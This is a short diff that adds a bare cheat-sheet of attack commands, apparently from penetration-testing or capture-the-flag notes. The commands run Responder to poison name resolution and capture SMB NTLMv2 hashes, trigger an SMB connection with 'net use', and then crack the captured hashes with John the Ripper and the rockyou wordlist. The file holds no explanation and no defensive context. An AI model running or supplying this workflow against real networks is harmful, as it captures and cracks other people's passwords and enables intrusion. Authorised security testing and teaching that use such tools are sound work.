@@ -1,0 +1,5 @@
+sudo responder -I enp0s3
+net use \\Ip\share
+sudo john /usr/share/responder/logs/SMB-NTLMv2-SSP-<Target_IP>.txt --wordlist=/usr/share/wordlists/rockyou.txt
+sudo john /usr/share/responder/logs/SMB-NTLMv2-SSP-<Target_IP>.txt --show
+
